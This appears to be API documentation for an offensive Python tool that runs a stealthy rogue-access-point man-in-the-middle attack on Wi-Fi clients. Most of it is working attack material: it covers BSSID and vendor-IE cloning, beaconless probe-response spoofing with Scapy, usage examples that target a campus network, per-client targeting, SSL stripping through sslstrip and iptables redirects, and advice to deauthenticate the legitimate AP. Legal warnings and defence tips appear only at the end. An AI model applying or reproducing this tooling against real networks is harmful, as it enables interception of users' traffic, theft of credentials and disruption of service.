# mitm_attack.py - MITM Attack Implementation

## Overview

Implements a stealthy Man-in-the-Middle attack by cloning a target AP without broadcasting beacons. Instead, it aggressively responds to probe requests to win client associations while remaining invisible to passive scanners.

## MITMAttack Class

### `__init__(interface, target_bssid, target_ssid, target_channel, password, upstream_iface=None, vendor_ies=None, beacon_interval=None, log_callback=None)`

**Parameters**:
- `interface` (str): Wireless interface (e.g., "wlan0")
- `target_bssid` (str): BSSID to clone
- `target_ssid` (str): SSID to advertise
- `target_channel` (int): WiFi channel
- `password` (str): WPA2 passphrase for rogue AP
- `upstream_iface` (str, optional): Internet forwarding interface
- `vendor_ies` (str, optional): Hex string of vendor IEs
- `beacon_interval` (int, optional): Beacon interval (ms)
- `log_callback` (callable, optional): Logging function

**Attributes**:
- `interface`, `monitor_iface`: Base and monitor interface names
- `target_bssid`, `target_ssid`, `target_channel`: Target AP characteristics
- `ap_manager`: APManager instance (hostapd without beacons)
- `probe_responder_thread`: Thread handling probe responses
- `stop_event`: Threading event for graceful shutdown
- `running`: Attack status flag
- `probes_received`, `responses_sent`: Statistics

---

### `start()`
**Purpose**: Begin MITM attack

**Implementation**:
1. Prepares interface (managed mode, regulatory domain)
2. Spoofs MAC address to match target BSSID
3. Configures hostapd to NOT send beacons
4. Starts APManager with custom beacon settings
5. Launches probe responder thread
6. Monitors for probe requests and sends custom responses

**Key Strategy**:
- **No Beacons**: Stays hidden from passive scanners
- **Aggressive Probe Responses**: Wins client associations
- **BSSID Cloning**: Appears identical to legitimate AP
- **Vendor IE Matching**: Mimics hardware fingerprint

---

### `stop()`
**Purpose**: Stop attack and cleanup

**Implementation**:
1. Sets stop_event
2. Stops probe responder thread
3. Stops AP manager
4. Restores interface to managed mode

---

### Internal Methods

#### `_prepare_interface(iface)`
Prepares interface for AP mode:
- Kills monitor mode instances
- Sets managed mode
- Sets regulatory domain
- Brings interface down for MAC spoofing

#### `_set_mac_address(iface, mac)`
Attempts to spoof MAC address:
- Tries `ip link set address`
- Falls back to `macchanger` if available
- Continues even if spoofing fails (best-effort)

#### `_start_monitor_mode()`
Creates monitor interface for probe monitoring (optional)

#### `_stop_monitor_mode()`
Removes monitor interface

#### `_probe_responder()`
**Core Attack Logic** (runs in thread):
1. Sniffs for Dot11ProbeReq frames
2. Filters for matching SSID or broadcast probes
3. Constructs custom Dot11ProbeResp with:
   - Target BSSID as source
   - Target channel
   - Vendor IEs (if provided)
   - Target SSID
4. Sends response immediately
5. Increments statistics

**Probe Response Frame Structure**:
```python
RadioTap() /
Dot11(
    addr1=client_mac,      # Destination
    addr2=target_bssid,    # Source (cloned)
    addr3=target_bssid     # BSSID
) /
Dot11ProbeResp(
    timestamp=current_time,
    beacon_interval=100,
    cap='ESS+privacy'      # WPA2
) /
Dot11Elt(ID=0, info=ssid) /     # SSID
Dot11Elt(ID=3, info=channel) /  # Channel
... vendor IEs ...
```

---

## Module Function

### `start_mitm_attack(interface, target_bssid, target_ssid, target_channel, password="password123", upstream_iface=None, vendor_ies=None, beacon_interval=None, log_callback=None) -> MITMAttack`

**Purpose**: Convenience function to create and start MITM attack

**Returns**: MITMAttack instance (already running)

---

## Usage Examples

### Basic MITM Attack
```python
from mitm_attack import MITMAttack

attack = MITMAttack(
    interface="wlan0",
    target_bssid="aa:bb:cc:dd:ee:ff",
    target_ssid="CampusWiFi",
    target_channel=6,
    password="password123",
    upstream_iface="eth0"
)

attack.start()
print("Attack running. Clients will connect to rogue AP.")

input("Press Enter to stop...")
attack.stop()
```

### With Logging
```python
def logger(msg):
    timestamp = time.strftime("%H:%M:%S")
    print(f"[{timestamp}] {msg}")

attack = MITMAttack(
    interface="wlan0",
    target_bssid="aa:bb:cc:dd:ee:ff",
    target_ssid="TargetNetwork",
    target_channel=11,
    password="rogue_pass",
    log_callback=logger
)

attack.start()
```

### Clone from Scan
```python
from scanner import scan_aps
from mitm_attack import start_mitm_attack

# Discover target
aps = scan_aps("wlan0mon", timeout=15)
target_bssid = "aa:bb:cc:dd:ee:ff"
target = aps[target_bssid]

# Launch attack
attack = start_mitm_attack(
    interface="wlan0",
    target_bssid=target_bssid,
    target_ssid=target['ssid'],
    target_channel=target['channel'],
    password="intercept123",
    vendor_ies=target['ies_hex'],
    beacon_interval=target['beacon_int'],
    upstream_iface="eth0"
)

# Monitor statistics
while True:
    time.sleep(5)
    print(f"Probes: {attack.probes_received}, Responses: {attack.responses_sent}")
```

---

## Attack Flow

```
1. Target Selection
   ↓
2. Interface Preparation
   - Stop monitor mode
   - Set managed mode
   - Spoof MAC to target BSSID
   ↓
3. Start Hostapd (NO BEACONS)
   - Configure with target characteristics
   - Enable WPA2 with password
   - Setup NAT for internet access
   ↓
4. Start Probe Responder
   - Listen for probe requests
   - Send immediate responses
   - Mimic legitimate AP perfectly
   ↓
5. Client Association
   - Clients receive probe response
   - Connect to rogue AP (same BSSID/SSID)
   - Rogue AP intercepts traffic
   ↓
6. Traffic Forwarding
   - NAT forwards to upstream interface
   - Attacker can inspect/modify traffic
```

---

## Stealth Characteristics

### Why It's Stealthy

1. **No Beacon Spam**: Invisible to WiFi scanners
2. **Reactive Only**: Responds only when probed
3. **Perfect Clone**: Identical BSSID, SSID, vendor IEs
4. **Selective Response**: Can target specific clients
5. **Natural Timing**: Probe responses appear legitimate

### Detection Challenges

**For Defenders**:
- Passive scanning won't detect it
- Active scanning with probes required
- Must correlate BSSID with physical location
- Requires monitoring probe response rates

**For Users**:
- Appears identical to legitimate AP
- Same SSID and security settings
- May have stronger signal (closer proximity)

---

## Attack Variations

### Targeted Attack
```python
# Only respond to specific clients
def custom_probe_responder(self):
    targets = {'11:22:33:44:55:66', 'aa:bb:cc:dd:ee:ff'}
    
    def handler(pkt):
        client_mac = pkt[Dot11].addr2.lower()
        if client_mac not in targets:
            return  # Ignore non-targets
        # ... send response ...
```

### Selective Blocking
```python
# Clone AP but deny internet access (disruption)
attack = MITMAttack(
    ...,
    upstream_iface=None  # No forwarding
)
```

### SSL Stripping
```python
# After attack.start(), run sslstrip
import subprocess
subprocess.Popen([
    'sslstrip',
    '-a',  # Log all traffic
    '-l', '8080'
])

# Configure iptables to redirect HTTP/HTTPS
subprocess.run([
    'iptables', '-t', 'nat', '-A', 'PREROUTING',
    '-p', 'tcp', '--destination-port', '80',
    '-j', 'REDIRECT', '--to-port', '8080'
])
```

---

## Troubleshooting

### MAC Spoofing Fails
**Issue**: Driver doesn't support MAC changes

**Solutions**:
1. Try `macchanger` tool
2. Use external USB adapter (better support)
3. Continue without spoofing (may still work if target AP is offline)

### No Clients Connect
**Causes**:
1. Legitimate AP signal stronger
2. Clients cached connection
3. 802.11w (Management Frame Protection) enabled

**Solutions**:
- Get physically closer to clients
- Deauth legitimate AP to force reconnection
- Use stronger antenna

### Hostapd Fails
**Issue**: Interface preparation problem

**Debug**:
```python
# Check interface state
import subprocess
subprocess.run(['iw', 'dev'])
subprocess.run(['ip', 'addr', 'show', 'wlan0'])

# View hostapd logs
# Logs written to attack.ap_manager._tmpdir
```

---

## Legal and Ethical Warnings

⚠️ **CRITICAL**: MITM attacks are **ILLEGAL** without authorization

**Legal Consequences**:
- Federal crimes (CFAA, Wiretap Act in US)
- Prison sentences up to 20+ years
- Massive fines
- Civil lawsuits

**Authorized Use Only**:
- Penetration testing with written contract
- Research in isolated lab environment
- Educational demonstrations (offline/simulated)
- Security audits with permission

**Never**:
- Attack public/commercial networks
- Intercept others' communications
- Use captured credentials
- Disrupt services

---

## Defense Recommendations

### For Network Operators

1. **802.11w (MFP)**: Protect management frames
2. **Certificate Pinning**: Prevent SSL MITM
3. **RADIUS/802.1X**: Strong authentication
4. **WIDS**: Deploy wireless intrusion detection
5. **Physical Security**: Prevent rogue device placement

### For Users

1. **VPN**: Always use VPN on untrusted networks
2. **HTTPS Everywhere**: Verify SSL certificates
3. **Verify Networks**: Check with IT before connecting
4. **Monitor Connections**: Watch for sudden disconnects/reconnects
5. **Corporate Profiles**: Use pre-configured network profiles

---

## Related Modules

- **ap_manager.py**: Provides hostapd management
- **scanner.py**: Target discovery and monitoring
- **gui.py**: GUI wrapper for MITM attacks
